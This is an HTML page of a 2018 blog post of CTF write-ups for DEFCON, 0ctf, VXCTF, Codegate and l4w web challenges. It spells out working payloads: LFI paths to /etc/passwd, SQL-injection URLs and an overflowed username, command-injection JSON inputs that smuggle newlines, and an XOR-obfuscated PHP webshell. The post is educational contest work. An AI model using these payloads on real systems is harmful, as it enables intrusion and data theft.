@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>DEFCON CTF 2018 Qual和一些有趣題目 | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">-->
+  <meta name="description" content="這篇主要用來記錄近期幾場CTF的一些Writeup和心得 DEFCON CTF 2018 Qual這場比賽我們隊和台大還有交大等隊伍一起組成聯隊 見識到其他隊伍跟自己的差距，學了很多">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEFCON CTF 2018 Qual和一些有趣題目">
+<meta property="og:url" content="http://blog.kaibro.tw/2018/05/16/DEFCON-CTF-2018-Qual/index.html">
+<meta property="og:site_name" content="Kaibro&#39;s blog">
+<meta property="og:description" content="這篇主要用來記錄近期幾場CTF的一些Writeup和心得 DEFCON CTF 2018 Qual這場比賽我們隊和台大還有交大等隊伍一起組成聯隊 見識到其他隊伍跟自己的差距，學了很多">
+<meta property="og:image" content="https://i.imgur.com/1m5PjtZ.png">
+<meta property="og:image" content="https://i.imgur.com/ddF81JT.png">
+<meta property="og:image" content="https://i.imgur.com/dilXywj.png">
+<meta property="og:image" content="https://i.imgur.com/FrUJbJz.png">
+<meta property="og:updated_time" content="2018-05-24T08:59:41.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEFCON CTF 2018 Qual和一些有趣題目">
+<meta name="twitter:description" content="這篇主要用來記錄近期幾場CTF的一些Writeup和心得 DEFCON CTF 2018 Qual這場比賽我們隊和台大還有交大等隊伍一起組成聯隊 見識到其他隊伍跟自己的差距，學了很多">
+<meta name="twitter:image" content="https://i.imgur.com/1m5PjtZ.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>標籤</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.57px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 12.86px;">DEFCON</a> <a href="/tags/Java/" style="font-size: 12.86px;">Java</a> <a href="/tags/Linux/" style="font-size: 11.43px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14.29px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.43px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 15.71px;">Pwn</a> <a href="/tags/Web/" style="font-size: 17.14px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">Web security菜雞</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img src="/img/head.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-DEFCON-CTF-2018-Qual" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/16/DEFCON-CTF-2018-Qual/" class="article-date">
+  	<time datetime="2018-05-15T19:37:40.000Z" itemprop="datePublished">2018-05-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DEFCON CTF 2018 Qual和一些有趣題目
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="tags/CTF/" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/Web/" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>這篇主要用來記錄近期幾場CTF的一些Writeup和心得</p>
+<h2 id="DEFCON_CTF_2018_Qual"><a href="#DEFCON_CTF_2018_Qual" class="headerlink" title="DEFCON CTF 2018 Qual"></a>DEFCON CTF 2018 Qual</h2><p>這場比賽我們隊和台大還有交大等隊伍一起組成聯隊</p>
+<p>見識到其他隊伍跟自己的差距，學了很多</p>
+<p><img src="https://i.imgur.com/1m5PjtZ.png" alt="rank"></p>
+<a id="more"></a>
+<h3 id="Easy_Pisy"><a href="#Easy_Pisy" class="headerlink" title="Easy Pisy"></a>Easy Pisy</h3><p>這題有兩個功能：<code>sign</code>跟<code>execute</code></p>
+<p>sign只給我們sign ECHO指令(他會用OCR去辨識pdf上的文字)</p>
+<p>execute功能如果給正確的signature，他就會去執行pdf上面的指令</p>
+<p>所以如果我們有辨法構造或繞過signature就能搞定這題惹</p>
+<p>這題比較難發現的關鍵點是，<code>openssl_verify</code>在sign前使用<code>SHA1</code></p>
+<p>也就是說可以去撞SHA1 Collision</p>
+<p>可以使用這個Tool來輔助：<a href="https://github.com/nneonneo/sha1collider/" target="_blank" rel="external">https://github.com/nneonneo/sha1collider/</a></p>
+<p>產生兩個pdf檔: (1) ECHO kaibro  (2) EXECUTE cat flag</p>
+<p>然後用這個Tool去撞SHA1 Collsion</p>
+<p>比較麻煩的點是，他的OCR有點不太精準，很多字型他都辨識得很差，可能要多踹幾次</p>
+<p>成功後，兩個pdf檔就有相同<code>SHA1 hash</code>，但兩個pdf用OCR辨識出來的文字不同</p>
+<p>我撞出來的兩個pdf如下:</p>
+<p><a href="https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/echo.pdf" target="_blank" rel="external">https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/echo.pdf</a></p>
+<p><a href="https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/execute.pdf" target="_blank" rel="external">https://github.com/w181496/CTF/blob/master/defcon2018-qual/EasyPisy/execute.pdf</a></p>
+<p>先sign pdf(1)，之後把得到的SHA1 hash和pdf(2)一起丟去execute，就拿到FLAG惹</p>
+<p><code>OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}</code></p>
+<p><img src="https://i.imgur.com/ddF81JT.png" alt=""></p>
+<h3 id="PHP_Eval_White-List"><a href="#PHP_Eval_White-List" class="headerlink" title="PHP Eval White-List"></a>PHP Eval White-List</h3><p>這題出壞惹</p>
+<p>直接<code>system(&quot;../flag&quot;)</code>就噴FLAG</p>
+<p><img src="https://i.imgur.com/dilXywj.png" alt=""></p>
+<h3 id="exzendtential-crisis"><a href="#exzendtential-crisis" class="headerlink" title="exzendtential-crisis"></a>exzendtential-crisis</h3><p>這題很容易可以發現LFI:</p>
+<p><code>http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&amp;name=../../../../../etc/passwd</code></p>
+<p>可以透過LFI去讀essays.php、login.php、register.php的源碼</p>
+<p>會發現login.php會去call一個奇怪的function: <code>check_credentials</code></p>
+<p>register.php也是: <code>create_user</code></p>
+<p>估計就是他自己寫的extension</p>
+<p>翻一下<code>php.ini</code>，可以找到<code>mydb.so</code>的路徑</p>
+<p>用LFI把他載下來: <code>/essays.php?preview&amp;name=../../../../../usr/lib/php/20151012/mydb.so</code></p>
+<p>用ida pro去看，可以發現它DB是用SQLite</p>
+<p>mydb.so有db路徑，所以可以把他的DB載下來 (但因為<code>file_get_contents</code>有長度限制，所以沒辦法載完整的)</p>
+<p><img src="https://i.imgur.com/FrUJbJz.png" alt=""></p>
+<p>會發現目標的帳號跟密碼: <code>sarte:5f0e11fe91a3196d7bf8e80a7ee0bbdf516b1952a57569e4809a9e7bf21ad0f6</code></p>
+<p>賽中有試著去撞，但撞不出來 (SHA256攪20次)</p>
+<p>然後就是一連串崩潰逆向 </p>
+<p>翻了一下之後，一直覺得這題應該是想考SQL Injection (因為裡面特別去擋SQL Injection payload，又擋不完整)</p>
+<p>然後他還會把參數裡面的<code>&#39;</code>換成<code>&#39;&#39;</code></p>
+<p>原本以為簡單的<code>\&#39;</code> =&gt; <code>\&#39;&#39;</code>就能惹，後來才知道原來SQLite不能這樣跳脫QQ</p>
+<p>賽後才知道原來洞在: </p>
+<p><code>check_hacking_attempt()</code>裡username可以蓋超過username_check，然後蓋到下面的<code>table_name</code></p>
+<p>source code在這: <a href="https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/" target="_blank" rel="external">https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/</a></p>
+<p>賽中是有踹出來username長度限制大概到111，但沒發現他是蓋到table_name</p>
+<p>所以最後payload只要這樣就能繞過惹:</p>
+<p><code>username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABusers where rowid=1;--&amp;password=a</code></p>
+<p>因為<code>AA...AAB</code>後面的<code>users where rowid=1</code>會蓋到<code>table_name</code></p>
+<p>所以這邊<code>snprintf(cmd, sizeof(cmd), &quot;select rowid from %s where username = &#39;%s&#39; and password = &#39;%s&#39;;&quot;, table_name, username, password);</code>就可以注入惹</p>
+<hr>
+<p>整體來說，這場的確很多黑人問號的題目</p>
+<p>(雖然也是有一些好題目)</p>
+<p>不少題目都有猜測或暴力的成分在裡頭</p>
+<p>Web題也是一堆都要去逆向<code>.so</code>檔，很不web</p>
+<p>不過隊友太Carry，最後聯隊還是拿到22名 跪惹</p>
+<p>第一次參加DEFCON Qual就打進決賽，運氣真的很好XD</p>
+<h2 id="0ctf_2018_Qual"><a href="#0ctf_2018_Qual" class="headerlink" title="0ctf 2018 Qual"></a>0ctf 2018 Qual</h2><h3 id="EzDoor"><a href="#EzDoor" class="headerlink" title="EzDoor"></a>EzDoor</h3><p>這題蠻有趣的，第一次碰opcache</p>
+<p>他有幾個小功能，可以看phpinfo、上傳檔案等</p>
+<p>雖然能上傳，但是會檢查副檔名有沒有出現h，有的話就算不合法</p>
+<p><code>stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;))</code></p>
+<p>傳其他檔案上去都不能直接訪問，會403，所以就是要想辦法蓋index.php</p>
+<p><code>move_uploaded_file()</code>可以覆蓋舊檔案，但是index.php副檔名有h，要想辦法繞</p>
+<p>直覺想到以前看過的一招: <code>index.php/.</code> </p>
+<p>但是這招沒辦法覆寫舊檔案，只能寫新檔案</p>
+<p>改用<code>a/../index.php/.</code>就能成功覆寫，這跟他底層實作有關，可以去翻source code</p>
+<p>賽後才知道這是非預期解法XD</p>
+<p>然後翻一下<code>/var/www/html/flag/</code>下面，會看到有個檔案<code>93f4c28c0cf0b07dfd7012dca2cb868cc0228cad</code></p>
+<p>裡頭是OPcache Byte code</p>
+<p>內容乍看之下是在做一連串flag的加解密</p>
+<p>大概就猜想可能要去逆向它</p>
+<p>於是找到這個Tool有Disassembler: <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p>但是踹了很久一直Fail，一開始還要裝特定版本的construct套件</p>
+<p>也修正opcache中間少一個NULL Byte的問題，結果還是不行，就卡在這沒解出來Orz</p>
+<p>賽後才知道Tool沒處理到某些opcode，要手動修正去逆向…</p>
+<p>修正後可以還原出以下pseudo code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">function encrypt() &#123;</div><div class="line">      #0 !0 = RECV(None, None);</div><div class="line">      #1 !0 = RECV(None, None);</div><div class="line">      #2 DO_FCALL_BY_NAME(None, &apos;mt_srand&apos;);</div><div class="line">      #3 SEND_VAL(1337, None);</div><div class="line">      #4 (129)?(None, None);</div><div class="line">      #5 ASSIGN(!0, &apos;&apos;);</div><div class="line">      #6 (121)?(!0, None);</div><div class="line">      #7 ASSIGN(None, None);</div><div class="line">      #8 (121)?(!0, None);</div><div class="line">      #9 ASSIGN(None, None);</div><div class="line">      #10 ASSIGN(None, 0);</div><div class="line">      #11 JMP(-&gt;-24, None);</div><div class="line">      #12 DO_FCALL_BY_NAME(None, &apos;chr&apos;);</div><div class="line">      #13 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #14 FETCH_DIM_R(!0, None);</div><div class="line">      #15 (117)?(None, None);</div><div class="line">      #16 (129)?(None, None);</div><div class="line">      #17 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #18 MOD(None, None);</div><div class="line">      #19 FETCH_DIM_R(!0, None);</div><div class="line">      #20 (117)?(None, None);</div><div class="line">      #21 (129)?(None, None);</div><div class="line">      #22 BW_XOR(None, None);</div><div class="line">      #23 DO_FCALL_BY_NAME(None, &apos;mt_rand&apos;);</div><div class="line">      #24 SEND_VAL(0, None);</div><div class="line">      #25 SEND_VAL(255, None);</div><div class="line">      #26 (129)?(None, None);</div><div class="line">      #27 BW_XOR(None, None);</div><div class="line">      #28 SEND_VAL(None, None);</div><div class="line">      #29 (129)?(None, None);</div><div class="line">      #30 ASSIGN_CONCAT(!0, None);</div><div class="line">      #31 PRE_INC(None, None);</div><div class="line">      #32 IS_SMALLER(None, None);</div><div class="line">      #33 JMPNZ(None, -&gt;134217662);</div><div class="line">      #34 DO_FCALL_BY_NAME(None, &apos;encode&apos;);</div><div class="line">      #35 (117)?(!0, None);</div><div class="line">      #36 (130)?(None, None);</div><div class="line">      #37 RETURN(None, None);</div><div class="line"></div><div class="line">&#125;</div><div class="line">function encode() &#123;</div><div class="line">      #0 RECV(None, None);</div><div class="line">      #1 ASSIGN(None, &apos;&apos;);</div><div class="line">      #2 ASSIGN(None, 0);</div><div class="line">      #3 JMP(-&gt;-81, None);</div><div class="line">      #4 DO_FCALL_BY_NAME(None, &apos;dechex&apos;);</div><div class="line">      #5 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</div><div class="line">      #6 FETCH_DIM_R(None, None);</div><div class="line">      #7 (117)?(None, None);</div><div class="line">      #8 (129)?(None, None);</div><div class="line">      #9 (117)?(None, None);</div><div class="line">      #10 (129)?(None, None);</div><div class="line">      #11 ASSIGN(None, None);</div><div class="line">      #12 (121)?(None, None);</div><div class="line">      #13 IS_EQUAL(None, 1);</div><div class="line">      #14 JMPZ(None, -&gt;-94);</div><div class="line">      #15 CONCAT(&apos;0&apos;, None);</div><div class="line">      #16 ASSIGN_CONCAT(None, None);</div><div class="line">      #17 JMP(-&gt;-96, None);</div><div class="line">      #18 ASSIGN_CONCAT(None, None);</div><div class="line">      #19 PRE_INC(None, None);</div><div class="line">      #20 (121)?(None, None);</div><div class="line">      #21 IS_SMALLER(None, None);</div><div class="line">      #22 JMPNZ(None, -&gt;134217612);</div><div class="line">      #23 RETURN(None, None);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">#0 ASSIGN(None, &apos;input_your_flag_here&apos;);</div><div class="line">#1 DO_FCALL_BY_NAME(None, &apos;encrypt&apos;);</div><div class="line">#2 SEND_VAL(&apos;this_is_a_very_secret_key&apos;, None);</div><div class="line">#3 (117)?(None, None);</div><div class="line">#4 (130)?(None, None);</div><div class="line">#5 IS_IDENTICAL(None, &apos;85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab&apos;);</div><div class="line">#6 JMPZ(None, -&gt;-136);</div><div class="line">#7 ECHO(&apos;Congratulation! You got it!&apos;, None);</div><div class="line">#8 EXIT(None, None);</div><div class="line">#9 ECHO(&apos;Wrong Answer&apos;, None);</div><div class="line">#10 EXIT(None, None);</div></pre></td></tr></table></figure>
+<p>後面就是去逆向然後推FLAG惹</p>
+<h2 id="VXCTF_2018"><a href="#VXCTF_2018" class="headerlink" title="VXCTF 2018"></a>VXCTF 2018</h2><p>這是vxcon的一場小CTF，雖然沒啥人參加</p>
+<p>不過題目其實蠻有趣的</p>
+<p>我也不小心刷了個第四名XDD</p>
+<h3 id="PHP_of_PHP"><a href="#PHP_of_PHP" class="headerlink" title="PHP of PHP"></a>PHP of PHP</h3><p>網站有兩個功能：(1)<code>view</code> (2)<code>diff</code></p>
+<p>view可以看各個版本的php.net源碼</p>
+<p>diff可以比較跟目前的差異 (用diff比)</p>
+<p>看一下source，會發現她用JS送request</p>
+<p>view是直接用GET訪問取得內容</p>
+<p>diff是用POST送JSON過去要內容</p>
+<p>送的都是<code>&quot;版本名/index&quot;</code></p>
+<p>看到這個直覺就是LFI</p>
+<p>把diff的request改成<code>{&quot;version&quot;:&quot;/etc/passwd&quot;}</code></p>
+<p>Bang! 噴出來惹 果然可以LFI</p>
+<p>再來就踹<code>{&quot;version&quot;:&quot;/v*/w*/h*/d*&quot;}</code>看diff.php源碼</p>
+<p>噴出這段關鍵code:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">set_time_limit(<span class="number">3</span>);</div><div class="line">@$data = json_decode(file_get_contents(<span class="string">'php://input'</span>), <span class="keyword">true</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($data[<span class="string">"version"</span>]))&#123;</div><div class="line">   $v = $data[<span class="string">"version"</span>];</div><div class="line">   <span class="keyword">if</span>(strlen($v) &gt;= <span class="number">15</span>)&#123;<span class="keyword">exit</span>(<span class="string">"Input too long!"</span>);&#125;</div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9\/\?\*\t\n]/'</span>,$v))&#123;<span class="keyword">exit</span>(<span class="string">"Special character found in input!"</span>);&#125;</div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/ls|cat|tac|nl|more|less|head|tail|od|strings|base64|sort|pg|uniq|rev/'</span>,$v))&#123;<span class="keyword">exit</span>(<span class="string">"Blacklisted command found in input!"</span>);&#125;</div><div class="line">   chdir(<span class="string">"web-php"</span>);</div><div class="line">   @system(<span class="string">"diff current/index $v"</span>);</div></pre></td></tr></table></figure>
+<p>可以明顯看到，這裡可以Command Injection</p>
+<p>只是他有擋掉特殊符號和一些關鍵字</p>
+<p>而換行雖然沒擋，可是json_decode不吃換行</p>
+<p>但是<code>json_decode</code>可以吃<code>\n</code>和<code>\t</code>，他decode會自動轉成換行</p>
+<p>不能ls，可以這樣列目錄: <code>{&quot;version&quot;:&quot;\necho\t*&quot;}</code></p>
+<p>再來可以發現存在這個檔案: <code>/th1s_i5_4_l0n9_f0ld3r_n4me/7hi5_i5_a_s3cre7_fi13</code></p>
+<p>直接讀出來就是FLAG: <code>{&quot;version&quot;:&quot;/th*/7*&quot;}</code></p>
+<p><code>vxctf{YezWiiWerBorn2MakeHistory}</code></p>
+<h3 id="Patch_Peep_Huck__28w_29"><a href="#Patch_Peep_Huck__28w_29" class="headerlink" title="Patch Peep Huck (w)"></a>Patch Peep Huck (w)</h3><p>這題應該是這場Web最有趣的一題XD</p>
+<p>很幸運的這題我拿到首殺</p>
+<p>最後也只有兩隊解出來</p>
+<p>題目長這樣:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=!$I=&amp;$_FILES[!!$l=<span class="string">'tmp_name'</span>]||$I[<span class="string">'size'</span>]&gt;&gt;<span class="number">7</span>||preg_match(<span class="string">'/\w/'</span>,join(file($I[$l])))?!show_source(<span class="keyword">__FILE__</span>):!<span class="keyword">include</span>($I[$l]);</div></pre></td></tr></table></figure>
+<p><code>!!$l=&#39;tmp_name&#39;</code>會把<code>$l</code>設成<code>&#39;tmp_name&#39;</code>，並且因為<code>NOT</code>運算，最後整句結果是1</p>
+<p>也就是<code>$_FILES[!!$l=&#39;tmp_name&#39;]</code>實際上就是存取<code>$_FILES[1]</code></p>
+<p><code>$I[&#39;size&#39;]&gt;&gt;7</code>是判斷size不能超過這個大小，否則這邊會變成True，就沒辦法include檔案了</p>
+<p>重點在最後一個條件: <code>preg_match(&#39;/\w/&#39;,join(file($I[$l])))</code></p>
+<p>這邊是取出我們上傳的檔案的內容，如果裡面有出現英數字或底線，就不給你include</p>
+<p>所以我們就是構造個「不用到英數字和底線」的webshell</p>
+<p>方法非常多，我這邊是用XOR去構造system字串和我要執行的command</p>
+<p>My Payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=</div><div class="line">$💩 = <span class="string">'[[[[@@'</span> ^ <span class="string">'("(/%-'</span>;</div><div class="line">$💩((<span class="string">'@@['</span>^<span class="string">'#!/'</span>).<span class="string">" /????"</span>);</div></pre></td></tr></table></figure>
+<p>他其實在做的就是<code>system(&quot;cat /????&quot;)</code></p>
+<p><code>vxctf{Symb01icExecut10nCanPhuck}</code></p>
+<h2 id="Codegate_2018_qual"><a href="#Codegate_2018_qual" class="headerlink" title="Codegate 2018 qual"></a>Codegate 2018 qual</h2><h3 id="SimpleCMS"><a href="#SimpleCMS" class="headerlink" title="SimpleCMS"></a>SimpleCMS</h3><p>這題是Code Review題目</p>
+<p>蠻明顯感覺就是在考SQL Injection</p>
+<p>但擋了一堆東西</p>
+<p>可以發現<code>col</code>參數沒有擋<code>#</code>和<code>:</code></p>
+<p>所以可以註解掉後面整句SQL</p>
+<p>那要怎麼利用這個點呢</p>
+<p><code>search</code>參數可以塞換行(<code>%0a</code>)!!</p>
+<p>換行之後可以繼續接SQL，這是這題最好玩的小trick</p>
+<p>透過註解+換行把中間一段不想要的SQL註解掉</p>
+<p>後面就可以去Union based注入惹</p>
+<p>只是這題他有擋<code>information.schema</code></p>
+<p>沒辦法知道表名、欄位名</p>
+<p>這裡可以用到另一個小trick</p>
+<p>因為他的table engine是<code>innodb</code></p>
+<p>我們可以這樣撈表名：</p>
+<p><code>/index.php?act=board&amp;mid=search&amp;type=2&amp;col=title|idx%23&amp;search=%0a)union+select+1,table_name,3,4,5 from mysql.innodb_table_stats limit 2,1--+</code></p>
+<p>爆flag也可以不需要Column name就撈出來:</p>
+<p><code>/index.php?act=board&amp;mid=search&amp;type=2&amp;col=title|idx%23&amp;search=%0a)union+select+c,2,3,4,5 from (SELECT 1 a,2 b,3 c, 4 d UNION SELECT * FROM 41786c497656426a6149_flag)x limit 1,1--+</code></p>
+<h2 id="l4w"><a href="#l4w" class="headerlink" title="l4w"></a>l4w</h2><p><a href="http://l4w.pw/%f0%9f%a4%94/" target="_blank" rel="external">http://l4w.pw/%f0%9f%a4%94/</a></p>
+<p>題目:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"lul.css"</span>&gt; </div><div class="line">&lt;pre&gt;</div><div class="line">&lt;h3&gt;🔥 Hall of Fame 🔥&lt;/h3&gt;</div><div class="line"><span class="meta">&lt;?</span>=file_get_contents(<span class="string">'hof.txt'</span>);<span class="meta">?&gt;</span></div><div class="line">&lt;hr&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Connect to localhost:8888 to get the flag</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'👉🏻'</span>] == <span class="string">'👌🏻'</span>) <span class="keyword">die</span>(phpinfo());</div><div class="line">$_ = $_GET[<span class="string">'⁣'</span>];</div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="keyword">die</span>(<span class="string">'the game is over'</span>); <span class="comment">// this page will be removed soon.</span></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[\w]&#123;4,&#125;/is"</span>,$_) || preg_match(<span class="string">"/\[|\"|'|\||\^|~|\./is"</span>,$_)) <span class="comment">// mình thích thì mình block hoy 👯</span></div><div class="line">     <span class="keyword">die</span>(<span class="string">"🙅"</span>); <span class="comment">// 4cm is too much</span></div><div class="line"><span class="keyword">eval</span>(substr($_,<span class="number">0</span>,<span class="number">30</span>));</div></pre></td></tr></table></figure>
+<p>這是我過年時做的一題</p>
+<p>很有趣的php題</p>
+<p>超愛這種短小又很吃技巧的題目XD</p>
+<p>這題解法很多，所以做完可以學到很多</p>
+<p>他限制了很多，例如不能出現連續長度4以上的英文數字底線等</p>
+<p>然後送過去的payload，他只會取前30 Bytes去<code>eavl</code></p>
+<p>最後要去讀<code>localhost:8888</code>才能拿到FLAG</p>
+<p>我自己一開始的方法就跟vxctf那題一樣，用xor構造system</p>
